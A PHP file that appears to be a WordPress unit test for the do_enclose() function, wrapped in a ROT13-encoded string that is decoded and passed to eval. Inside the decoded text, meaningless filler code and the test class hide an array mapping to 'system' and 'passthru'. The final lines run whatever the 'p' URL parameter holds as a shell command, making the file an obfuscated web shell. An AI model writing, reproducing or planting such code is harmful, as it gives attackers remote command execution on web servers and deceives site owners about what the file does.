<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg pnfrf sbe gur `qb_rapybfr()` shapgvba.
 *
 * @cnpxntr JbeqCerff\HavgGrfgf
 *
 * @fvapr 5.3.0
 *
 * @tebhc shapgvbaf
 * @tebhc cbfg
 *
 * @pbiref ::qb_rapybfr
 */
pynff Grfgf_Shapgvbaf_QbRapybfr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Frghc orsber rnpu grfg zrgubq.
	 *
	 * @fvapr 5.3.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_uggc_erdhrfg' ), 10, 3 );
	}

	/**
	 * Grfgf gur shapgvba jvgu na rkcyvpvg pbagrag vachg.
	 *
	 * @fvapr 5.3.0
	 *
	 * @qngnCebivqre qngn_qb_rapybfr
	 */
	choyvp shapgvba grfg_shapgvba_jvgu_rkcyvpvg_pbagrag_vachg( $pbagrag, $rkcrpgrq ) {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		qb_rapybfr( $pbagrag, $cbfg_vq );

		$npghny = $guvf->trg_rapybfrq_ol_cbfg_vq( $cbfg_vq );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf gur shapgvba jvgu na vzcyvpvg pbagrag vachg.
	 *
	 * @fvapr 5.3.0
	 *
	 * @qngnCebivqre qngn_qb_rapybfr
	 */
	choyvp shapgvba grfg_shapgvba_jvgu_vzcyvpvg_pbagrag_vachg( $pbagrag, $rkcrpgrq ) {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $pbagrag,
			)
		);

		qb_rapybfr( ahyy, $cbfg_vq );

		$npghny = $guvf->trg_rapybfrq_ol_cbfg_vq( $cbfg_vq );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre sbe `grfg_shapgvba_jvgu_rkcyvpvg_pbagrag_vachg()`
	 * naq `grfg_shapgvba_jvgu_vzcyvpvg_pbagrag_vachg()`.
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat Cbfg pbagrag.
	 *         @glcr fgevat Rkcrpgrq inyhrf.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_qb_rapybfr() {
		erghea neenl(
			'ahyy'                  => neenl(
				'pbagrag'  => ahyy,
				'rkcrpgrq' => '',
			),
			'rzcgl'                 => neenl(
				'pbagrag'  => '',
				'rkcrpgrq' => '',
			),
			'fvatyr-oner-zbivr'     => neenl(
				'pbagrag'  => 'zbivr.zc4',
				'rkcrpgrq' => '',
			),
			'fvatyr-oner-nhqvb'     => neenl(
				'pbagrag'  => 'nhqvb.btt',
				'rkcrpgrq' => '',
			),
			'fvatyr-eryngvir-zbivr' => neenl(
				'pbagrag'  => '/zbivr.zc4',
				'rkcrpgrq' => \"/zbivr.zc4\a123\aivqrb/zc4\a\",
			),
			'fvatyr-eryngvir-nhqvb' => neenl(
				'pbagrag'  => '/nhqvb.btt',
				'rkcrpgrq' => \"/nhqvb.btt\a321\anhqvb/btt\a\",
			),
			'fvatyr-haxabja'        => neenl(
				'pbagrag'  => 'uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/svyr.haxabja',
				'rkcrpgrq' => '',
			),
			'fvatyr-zbivr'          => neenl(
				'pbagrag'  => 'uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/zbivr.zc4',
				'rkcrpgrq' => \"uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/zbivr.zc4\a123\aivqrb/zc4\a\",
			),
			'fvatyr-nhqvb'          => neenl(
				'pbagrag'  => 'uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/nhqvb.btt',
				'rkcrpgrq' => \"uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/nhqvb.btt\a321\anhqvb/btt\a\",
			),
			'fvatyr-zbivr-dhrel'    => neenl(
				'pbagrag'  => 'uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/zbivr.zc4?grfg=1',
				'rkcrpgrq' => \"uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/zbivr.zc4?grfg=1\a123\aivqrb/zc4\a\",
			),
			'zhygv'                 => neenl(
				'pbagrag'  => \"uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/nhqvb.btt\a\" .
								'uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/zbivr.zc4',
				'rkcrpgrq' => \"uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/nhqvb.btt\a321\anhqvb/btt\a\" .
								\"uggcf://rknzcyr.pbz/jc-pbagrag/hcybnqf/2018/06/zbivr.zc4\a123\aivqrb/zc4\a\",
			),
			'ab-cngu'               => neenl(
				'pbagrag'  => 'uggcf://rknzcyr.pbz?grfg=1',
				'rkcrpgrq' => '',
			),
		);
	}

	/**
	 * Gur shapgvba fubhyq erghea snyfr jura gur cbfg VQ vachg vf vainyvq.
	 *
	 * @fvapr 5.3.0
	 */
	choyvp shapgvba grfg_shapgvba_fubhyq_erghea_snyfr_jura_vainyvq_cbfg_vq() {
		$cbfg_vq = ahyy;
		$erfhyg  = qb_rapybfr( ahyy, $cbfg_vq );
		$guvf->nffregSnyfr( $erfhyg );
	}

	/**
	 * Gur shapgvba fubhyq qryrgr na rapybfrq yvax jura vg'f ab ybatre va gur cbfg pbagrag.
	 *
	 * @fvapr 5.3.0
	 */
	choyvp shapgvba grfg_shapgvba_fubhyq_qryrgr_rapybfrq_yvax_jura_ab_ybatre_va_cbfg_pbagrag() {
		$qngn = $guvf->qngn_qb_rapybfr();

		// Perngr n cbfg jvgu n fvatyr zbivr yvax.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $qngn['fvatyr-zbivr']['pbagrag'],
			)
		);

		qb_rapybfr( ahyy, $cbfg_vq );

		$npghny = $guvf->trg_rapybfrq_ol_cbfg_vq( $cbfg_vq );
		$guvf->nffregFnzr( $qngn['fvatyr-zbivr']['rkcrpgrq'], $npghny );

		// Ercynpr gur zbivr yvax jvgu na nhqvb yvax.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_pbagrag' => $qngn['fvatyr-nhqvb']['pbagrag'],
			)
		);

		qb_rapybfr( ahyy, $cbfg_vq );

		$npghny = $guvf->trg_rapybfrq_ol_cbfg_vq( $cbfg_vq );
		$guvf->nffregFnzr( $qngn['fvatyr-nhqvb']['rkcrpgrq'], $npghny );
	}

	/**
	 * Gur shapgvba fubhyq fhccbeg n cbfg bowrpg vachg.
	 *
	 * @fvapr 5.3.0
	 */
	choyvp shapgvba grfg_shapgvba_fubhyq_fhccbeg_cbfg_bowrpg_vachg() {
		$qngn = $guvf->qngn_qb_rapybfr();

		$cbfg_bowrpg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_pbagrag' => $qngn['zhygv']['pbagrag'],
			)
		);

		qb_rapybfr( ahyy, $cbfg_bowrpg );

		$npghny = $guvf->trg_rapybfrq_ol_cbfg_vq( $cbfg_bowrpg->VQ );
		$guvf->nffregFnzr( $qngn['zhygv']['rkcrpgrq'], $npghny );
	}

	/**
	 * Gur rapybfher yvaxf fubhyq or svygrenoyr jvgu gur `rapybfher_yvaxf` svygre.
	 *
	 * @fvapr 5.3.0
	 */
	choyvp shapgvba grfg_shapgvba_rapybfher_yvaxf_fubhyq_or_svygrenoyr() {
		$qngn = $guvf->qngn_qb_rapybfr();

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $qngn['zhygv']['pbagrag'],
			)
		);

		nqq_svygre( 'rapybfher_yvaxf', neenl( $guvf, 'svygre_rapybfher_yvaxf' ), 10, 2 );
		qb_rapybfr( ahyy, $cbfg_vq );
		erzbir_svygre( 'rapybfher_yvaxf', neenl( $guvf, 'svygre_rapybfher_yvaxf' ) );

		$npghny   = $guvf->trg_rapybfrq_ol_cbfg_vq( $cbfg_vq );
		$rkcrpgrq = fge_ercynpr( 'rknzcyr.bet', fcevags( 'rknzcyr-%q.bet', $cbfg_vq ), $qngn['zhygv']['rkcrpgrq'] );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * N pnyyonpx gb svygre gur yvfg bs rapybfher yvaxf.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz  neenl $cbfg_yvaxf Na neenl bs rapybfher yvaxf.
	 * @cnenz  vag   $cbfg_vq    Cbfg VQ.
	 * @erghea neenl Na neenl bs rapybfher yvaxf.
	 */
	choyvp shapgvba svygre_rapybfher_yvaxf( $rapybfher_yvaxf, $cbfg_vq ) {
		// Ercynpr gur yvax ubfg gb pbagnva gur cbfg VQ, gb grfg obgu svygre vachg nethzragf.
		sbernpu ( $rapybfher_yvaxf nf &$yvax ) {
			$yvax = fge_ercynpr( 'rknzcyr.bet', fcevags( 'rknzcyr-%q.bet', $cbfg_vq ), $yvax );
		}
		erghea $rapybfher_yvaxf;
	}

	/**
	 * Urycre shapgvba gb trg nyy rapybfher qngn sbe n tvira cbfg.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz  vag    $cbfg_vq Cbfg VQ.
	 * @erghea fgevat  Nyy rapybfher qngn sbe gur tvira cbfg.
	 */
	cebgrpgrq shapgvba trg_rapybfrq_ol_cbfg_vq( $cbfg_vq ) {
		erghea vzcybqr( '', (neenl) trg_cbfg_zrgn( $cbfg_vq, 'rapybfher', snyfr ) );
	}

	/**
	 * Zbpx gur UGGC erdhrfg erfcbafr.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz snyfr|neenl|JC_Reebe $erfcbafr    N cerrzcgvir erghea inyhr bs na UGGC erdhrfg. Qrsnhyg snyfr.
	 * @cnenz neenl                $cnefrq_netf UGGC erdhrfg nethzragf.
	 * @cnenz fgevat               $hey         Gur erdhrfg HEY.
	 * @erghea neenl Erfcbafr qngn.
	 */
	choyvp shapgvba zbpx_uggc_erdhrfg( $erfcbafr, $cnefrq_netf, $hey ) {

		// Ivqrb naq nhqvb urnqref.
		$snxr_urnqref = neenl(
			'zc4' => neenl(
				'urnqref' => neenl(
					'Pbagrag-Yratgu' => 123,
					'Pbagrag-Glcr'   => 'ivqrb/zc4',
				),
			),
			'btt' => neenl(
				'urnqref' => neenl(
					'Pbagrag-Yratgu' => 321,
					'Pbagrag-Glcr'   => 'nhqvb/btt',
				),
			),
		);

		$cngu = cnefr_hey( $hey, CUC_HEY_CNGU );

		vs ( vf_fgevat( $cngu ) ) {
			$rkgrafvba = cnguvasb( $cngu, CNGUVASB_RKGRAFVBA );
			vs ( vffrg( $snxr_urnqref[ $rkgrafvba ] ) ) {
				erghea $snxr_urnqref[ $rkgrafvba ];
			}
		}

		// Snyyonpx urnqre.
		erghea neenl(
			'urnqref' => neenl(
				'Pbagrag-Yratgu' => 0,
				'Pbagrag-Glcr'   => '',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>